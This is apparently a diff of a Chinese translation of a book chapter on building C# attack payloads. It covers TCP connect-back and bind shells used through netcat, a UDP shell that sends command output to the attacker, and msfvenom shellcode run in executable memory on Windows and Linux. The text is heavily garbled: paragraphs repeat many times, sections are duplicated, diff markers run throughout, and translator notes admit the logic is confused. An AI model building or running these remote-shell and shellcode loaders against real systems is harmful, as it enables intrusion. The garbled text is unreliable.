-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
+在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。
 
 在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。现在我们需要运行命令并将输出传回攻击者。如列表 4-4 所示，我们使用 `Process` 和 `ProcessStartInfo` 类，这允许我们定义命令的某些选项：`FileName` 属性是我们想要运行的命令，`Arguments` 属性包含任何参数。
 
-我们还将将 `UseExecute` 赋值为 `false`，并将 `RedirectOutput` 属性赋值为 `true`。如果 `UseExecute` 被设置为 `true`，命令将在另一个 shell 中运行，而不是由可执行文件直接运行。当 `RedirectOutput` 设置为 `true` 时，可以使用 `Process` 类的 `StandardOutput` 属性来创建命令输出。
+
+
+我们还将 `UseExecute` 赋值为 `false`，并将 `RedirectOutput` 属性赋值为 `true`。如果 `UseExecute` 被设置为 `true`，命令将在另一个 shell 中运行，而不是由可执行文件直接运行。当 `RedirectOutput` 设置为 `true` 时，可以使用 `Process` 类的 `StandardOutput` 属性来创建命令输出。
 
 一旦设置了 `StandardOutput` 属性，我们就可以调用 `Start()` 开始执行命令。在进程运行时，我们通过 `StandardOutput` 流的 `BaseStream` 使用 `CopyTo()` 将输出直接复制到网络流传给攻击者。
 
-```
+```csharp
 try {
     Process proc = new Process();
     proc.StartInfo = new ProcessStartInfo();
@@ -3159,9 +3194,6 @@ try {
 public static void Main(string[] args)
 ```
 
-
-
-
 ```c
 {
 int port = int.Parse(args[0]);
@@ -3173,9 +3205,9 @@ try {
 }
 ```
 
-列表 4-6：启动一个 TcpListener，我们使用 `int.Parse` 将传递给负载的参数转换为整数。
+列表 4-6：启动一个 `TcpListener`，我们使用 `int.Parse` 将传递给负载的参数转换为整数。
 
-在我们开始监听之前，首先执行 `int.Parse(args[0])`，这将是监听的端口。然后，我们通过通过将 `IPAddress.Any` 作为构造函数的第一个参数，并将我们想要监听的端口作为第二个参数，来实例化新的 `TcpListener` 类。传递给第一个参数的 `IPAddress.Any` 值告诉 `TcpListener` 监听在任何可用的接口 (0.0.0.0)。
+在我们开始监听之前，首先执行 `int.Parse(args[0])`，这将是监听的端口。然后，我们通过将 `IPAddress.Any` 作为构造函数的第一个参数，并将我们想要监听的端口作为第二个参数，来实例化新的 `TcpListener` 类。传递给第一个参数的 `IPAddress.Any` 值告诉 `TcpListener` 监听在任何可用的接口（0.0.0.0）。
 
 接下来，我们在 `try/catch` 块中开始在端口上监听。这样做是因为调用 `Start()` 可能会抛出异常，例如，如果负载没有以特权用户运行并尝试绑定到小于 1024 的端口号，或者尝试绑定到已被另一个程序占用的端口。通过在 `try/catch` 块中运行 `Start()`，我们可以捕获此异常并在必要时优雅地退出。当然，如果 `Start()` 成功，负载将开始在相应端口上监听新连接。
 
@@ -3282,43 +3314,38 @@ catch {
 
 ## 使用 UDP 攻击网络
 
+
+
 与上一节讨论的反向连接负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
 
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
+使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
 
 ## 使用 UDP 攻击网络
 
 与上一节讨论的反向连接负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
 
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
+使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
 
 ## 使用 UDP 攻击网络
 
 与上一节讨论的反向连接负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
 
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
+使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
 
 ## 使用 UDP 攻击网络
 
 与上一节讨论的反向连接负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
 
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
+使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
 
 ## 使用 UDP 攻击网络
 
 与上一节讨论的反向连接负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
 
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
-
-## 使用 UDP 攻击网络
-
-与上一节讨论的反向连接负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
-
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
+使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
 
 （注：由于提供的文本中存在大量重复的段落，根据“不要重复输出原文”的原则，此处译文仅包含核心逻辑翻译部分。）
 
-[content]
 ```c
 {
 int port = int.Parse(args[0]);
@@ -3330,9 +3357,9 @@ try {
 }
 ```
 
-列表 4-6：启动一个 TcpListener，我们使用 `int.Parse` 将传递给负载的参数转换为整数。
+列表 4-6：启动一个 `TcpListener`，我们使用 `int.Parse` 将传递给负载的参数转换为整数。
 
-在我们开始监听之前，首先执行 `int.Parse(args[0])`，这将是监听的端口。然后，我们通过通过将 `IPAddress.Any` 作为构造函数的第一个参数，并将我们想要监听的端口作为第二个参数，来实例化新的 `TcpListener` 类。传递给第一个参数的 `IPAddress.Any` 值告诉 `TcpListener` 监听在任何可用的接口 (0.0.0.0)。
+在我们开始监听之前，首先执行 `int.Parse(args[0])`，这将是监听的端口。然后，我们通过将 `IPAddress.Any` 作为构造函数的第一个参数，并将我们想要监听的端口作为第二个参数，来实例化新的 `TcpListener` 类。传递给第一个参数的 `IPAddress.Any` 值告诉 `TcpListener` 监听在任何可用的接口 (0.0.0.0)。
 
 接下来，我们在 `try/catch` 块中开始在端口上监听。这样做是因为调用 `Start()` 可能会抛出异常，例如，如果负载没有以特权用户运行并尝试绑定到小于 1024 的端口号，或者尝试绑定到已被另一个程序占用的端口。通过在 `try/catch` 块中运行 `Start()`，我们可以捕获此异常并在必要时优雅地退出。当然，如果 `Start()` 成功，负载将开始在相应端口上监听新连接。
 
@@ -3399,13 +3426,11 @@ catch {
 
 与上一节讨论的反向连接（connect-back）负载一样，为了运行命令，我们实例化了一个新的 `Process` 类 1，并为 `Process` 类分配了一个新的 `ProcessStartInfo` 类。我们将命令设为 `FileName` 属性 2，并将参数设为 `Arguments` 属性 3。然后我们将 `UseShellExecute` 属性设置为 `false`，以便我们直接执行命令，并把 `RedirectStandardOutput` 属性设置为 `true`，这样我们就可以捕获命令输出并将其返回给攻击者。要启动命令，我们调用 `Process` 类的 `Start()` 4。在进程运行时，我们通过将标准输出作为参数传递给 `CopyTo()` 5，直接将其捕获到网络流中，然后等待进程退出。如果发生错误，我们使用 `Encoding.ASCII.GetBytes()` 将字符串转换为字节数组 6。字节数组被写入网络流并使用流的 `Write()` 7 发送给攻击者。
 
-使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
+使用 `4444` 作为参数运行负载将使监听器在所有可用接口上监听端口 `4444`。现在使用 `netcat` 连接到监听器，如列表 4-9 所示，并开始执行命令并返回它们的输出。（列表 4-9）
 
 ## 使用 UDP 攻击网络
 
 ...（后续重复内容略省略）
-
-
 
 UDP 广播，如列表 4-12 所示。
 
@@ -3442,6 +3467,8 @@ using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 
 
 现在，我们需要设置用于将命令输出返回给发送者的套字。我们将使用 UDP 套字广播数据。使用 `Socket` 类，通过将枚举值作为参数传递给 `Socket` 构造函数来实例化一个新的 `Socket`。第一个值 `AddressFamily.InterNetwork` 表示使用 IPv4 地址进行通信。第二个值 `SocketType.Dgram` 意味着我们将使用 UDP 数据报（UDP 中的 D）而不是 TCP 数据包。第三个也是最后一个值 `ProtocolType.Udp` 告诉套字我们将使用 UDP 与远程主机通信。
 
+
+
 在创建用于通信的套字后，我们分配一个具有 `localIPAddress` 属性值 ③ 的新 `IPAddress`，该值在我们的 UDP 监听器接收数据时已填充了攻击者的 IP 地址。我们创建一个新的 `IPEndPoint` ④，其包含攻击者的 `IPAddress` 和作为参数传递给负载的监听端口。
 
 一旦设置好套字并知道我们要将命令输出返回到哪里，`Encoding.ASCII.GetBytes()` ⑤ 就会将输出转换为字节数组。我们在套字上使用 `SendTo` ⑥，通过将包含命令输出的字节数组作为第一个参数，并将发送者的端点作为第二个参数，将数据广播回攻击者。最后，我们返回到 `while` 循环的开头，以读取另一个命令。
@@ -3460,6 +3487,7 @@ static void Main(string[] args)
     string output = "";
     byte[] bytes; 
 ```
+
 列表 4-13：为攻击者端代码设置 UDP 监听器和其他变量
 
 假设此代码将作为发送命令的主机和要监听的端口的参数，我们将要监听的端口传递给 `Parse()` ⑦ 以将字符串转换为整数，然后将生成的整数传递给 `UdpClient` 构造函数 ⑧ 以实例化一个新的 `UdpClient` 类。然后我们将监听端口连同 `IPAddress.Any` 值 ⑨ 传递给 `IPEndPoint` 构造函数。一旦 `IPEndPoint` 设置好，我们就声明变量 `output` 和 `bytes` 以供稍后使用。
@@ -3474,6 +3502,7 @@ using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, Pr
   IPAddress addr = IPAddress.Parse(args[0]);
   IPEndPoint addrEP = new IPEndPoint(addr, lport);
 ```
+
 首先，我们在块的上下范围内实例化一个新的 `Socket` 类。传递给 `Socket` 的枚举值告诉我们将使用 IPv4 寻址、数据报和 UDP 通过广播进行通信。我们使用 `IPAddress.Parse(args)` 实例化一个新的 `IPAddress`，将传递给代码的第一个参数转换为 `IPAddress` 类。然后我们实例化 `IPEndPoint` 对象和目标 UDP 监听器将监听的端口，以便实例化一个新的 `IPEndPoint` 类。
 
 ## 与目标通信
@@ -3503,6 +3532,7 @@ catch (Exception ex)
   Console.WriteLine("Exception {0}", ex.Message);
 }
 ```
+
 列表 4-15：向目标 UDP 监听器发送和接收数据的主逻辑
 
 在打印了一些关于如何使用此脚本的友好提示后，我们开始在 `while` 循环中向目标发送命令。首先，`Console.ReadLine()` ① 从标准输入读取一行数据，该数据将成为发送到目标机器的命令。然后，`Encoding.ASCII.GetBytes()` 将此字符串转换为可以在网络上发送的数组。
@@ -3525,19 +3555,19 @@ Metasploit Framework 工具集由 HD Moore 开始，现在由 Rapid7 开发，�
 $ sudo apt-get install
 $ git clone github.com/rapid7/metasploit-framework.git
 ```
+
 列表 4-17：安装 git 并克隆 Metasploit Framework
 
 > 注意
+
 建议在开发本章负载时使用 Ubuntu。当然，也需要在 Windows 上进行测试，以确保你的操作系统检测和负载能够跨平台工作。
-
-
-
 
 ```
 $ rvm install 2.x
 ```
 
 **列表 4-20:** 安装 Metasploit 需要的 Ruby 版本
+
 一旦 Ruby 安装完成，设置你的 bash 环境以查看它，如[列表 4-21](#)所示。
 
 ```
@@ -3583,13 +3613,13 @@ byte[] buf = new byte[276] {
 0x63,0x2e,0x65,0x78,0x65,0x00 }; // 列表 4-24: 运行 msfvenom 生成运行 calc.exe 的原始负载
 ```
 
-在这里，我们将 windows/x64/exec 作为负载，将 csharp 作为负载格式，并将负载选项 CMD=calc.exe 传入。你可能还会传入类似 linux/x86/exec 配合 CMD=whoami 的内容，以生成一个在 32 位 Linux 系统上启动时返回命令 whoami 结果的负载。
+在这里，我们将 `windows/x64/exec` 作为负载，将 `csharp` 作为负载格式，并将负载选项 `CMD=calc.exe` 传入。你可能还会传入类似 `linux/x86/exec` 配合 `CMD=whoami` 的内容，以生成一个在 32 位 Linux 系统上启动时返回命令 `whoami` 结果的负载。
 
 ## 作为非托管代码执行原生 Windows 负载
 
 Metasploit 负载是以 32 位或 64 位的汇编代码生成的——这在 .NET 世界中被称为非托管代码（unmanaged code）。当你将 C# 代码编译为 DLL 或可执行程序集时，它被称为托管代码（managed code）。两者的区别在于托管代码需要 .NET 或 Mono 虚拟机才能运行，而非托管代码可以由操作系统直接运行。
 
-要在托管环境中执行非托管代码，我们将使用 .NET 的 PInvoke 来导入并运行 Microsoft Windows kernel32.dll 中的 VirtualAlloc() 函数。这允许我们分配可读、可写且可执行的内存，如列表 4-25 所示。
+要在托管环境中执行非托管代码，我们将使用 .NET 的 PInvoke 来导入并运行 Microsoft Windows `kernel32.dll` 中的 `VirtualAlloc()` 函数。这允许我们分配可读、可写且可执行的内存，如列表 4-25 所示。
 
 ```csharp
 class ClassName
@@ -3600,9 +3630,9 @@ class ClassName
     delegate void WindowsRun(IntPtr ptr); // 列表 4-25: 从 kernel32.dll 导入 VirtualAlloc() 函数并定义 Windows 特有的委托
 ```
 
-在 ① 处，我们从 kernel32.dll 导入 VirtualAlloc()。该函数接受四个 IntPtr 参数，使得托管和非托管代码之间的交互变得简单得多。在 ② 处，C# 特性 DllImport 是 Java 中的注解或 Python 中的装饰器，告诉虚拟机在运行时从 kernel32.dll 库中查找该函数。（在执行 Linux 负载时，我们将使用 DllImport 特性从 libc 导入函数。）在 ③ 处，我们声明了 WindowsRun()，它有一个 UnmanagedFunctionPointer 特性，告诉 Mono/.NET 虚拟机将此委托作为非托管函数运行。通过向 UnmanagedFunctionPointer 特性传递 CallingConvention.StdCall，我们告诉 Mono/.NET 虚拟机使用 StdCall Windows 调用约定来调用 VirtualAlloc()。
+在 ① 处，我们从 `kernel32.dll` 导入 `VirtualAlloc()`。该函数接受四个 `IntPtr` 参数，使得托管和非托管代码之间的交互变得简单得多。在 ② 处，C# 特性 `DllImport` 是 Java 中的注解或 Python 中的装饰器，告诉虚拟机在运行时从 `kernel32.dll` 库中查找该函数。（在执行 Linux 负载时，我们将使用 `DllImport` 特性从 `libc` 导入函数。）在 ③ 处，我们声明了 `WindowsRun()`，它有一个 `UnmanagedFunctionPointer` 特性，告诉 Mono/.NET 虚拟机将此委托作为非托管函数运行。通过向 `UnmanagedFunctionPointer` 特性传递 `CallingConvention.StdCall`，我们告诉 Mono/.NET 虚拟机使用 StdCall Windows 调用约定来调用 `VirtualAlloc()`。
 
-首先，我们需要写一个 Main() 方法来根据系统静态架构执行负载，如列表 4-26 所示。
+首先，我们需要写一个 `Main()` 方法来根据系统静态架构执行负载，如列表 4-26 所示。
 
 ```csharp
 public static void Main(string[] args)
@@ -3628,7 +3658,7 @@ public static void Main(string[] args)
 
 ## 执行原生 Linux 负载
 
-在本节中，我们将介绍如何在可以在 Linux 和 Windows 上编译的负载。但首先，我们需要从 libc 导入函数并定义我们的 Linux 非托管函数委托，如列表 4-27 所示。
+在本节中，我们将介绍如何在可以在 Linux 和 Windows 上编译的负载。但首先，我们需要从 `libc` 导入函数并定义我们的 Linux 非托管函数委托，如列表 4-27 所示。
 
 ```csharp
 [DllImport("libc")]
@@ -3644,9 +3674,7 @@ static extern void free(IntPtr ptr);
 delegate void LinuxRun(); // 列表 4-27: 设置运行 Metasploit 负载的负载
 ```
 
-
-
-CallingConvention::Cdecl ①，因为 cdecl 是 Unix 类环境中环境中原生函数的调用约定。
+`CallingConvention::Cdecl` ①，因为 cdecl 是 Unix 类环境中环境中原生函数的调用约定。
 
 在列表 4-28 中，我们在 `Main()` 方法中添加了一个 `else if` 语句，它紧跟在测试我们是否在 Windows 机器上的 `if` 语句之后（参考列表 4-26 中的 ②）。
 
@@ -3667,6 +3695,8 @@ else if ((os.Platform == 4 || (os.Platform == 6 || (os.Platform == 128)))
 
 现在我们开始分配内存将我们的汇编代码插入内存中，如列表 4-29 所示。
 
+
+
 ```csharp
 IntPtr ptr = IntPtr.Zero;
 IntPtr success = IntPtr.Zero;
@@ -3682,7 +3712,7 @@ try {
     }
 ```
 
-列表 4-29：使用 posix_mallocalign() 分配内存
+列表 4-29：使用 `posix_mallocalign()` 分配内存
 
 首先，我们定义了几个变量：`ptr`，如果一切顺利，`posix_mallocalign()` 将为其分配分配内存起始位置的指针；`success`，如果分配成功，将被赋值 `posix_memalign` 返回的值；以及布尔值 `freeMe`，当分配成功时它将为 `true`，以便我们知道何时需要释放分配的内存。（在分配失败的情况下，我们将 `freeMe` 赋值为 `false`）。我们启动一个 `try` 块来开始分配，以便我们可以捕获任何异常并在发生错误时优雅地退出负载。我们设置了一个名为 `pagesize` 的新变量为 4096，这等于大多数 Linux 安装上的默认内存大小。
 
@@ -3701,13 +3731,14 @@ return;
 列表 4-30：更改分配内存的模式
 
 > 注意
+
 在 Linux 上实现代码执行的技术不适用于限制 RWX 内存的操作系统。例如，如果你的 Linux 发行版运行了 SELinux，这些示例可能无法工作。由于此原因，我建议使用 Ubuntu——因为没有 SELinux，这些示例应该可以运行。
 
 为了确保稍后释放分配的内存，我们通过对指针与 `pagesize` 取反码进行位与运算，使用 `posix_mallocalign()` 创建一个页对齐指针。本质上，取反码会将指针地址转换为负数，以便我们设置内存权限的计算是正确的。
 
 由于 Linux 分配内存的方式，我们更改负载所在的整个内存页。与当前 `pagesize` 取反码的位与运算会将 `posix_mallocalign()` 给我们的地址向下对齐到内存页边界。这允许我们设置 `posix_memalign()` 所使用的内存页的模式。
 
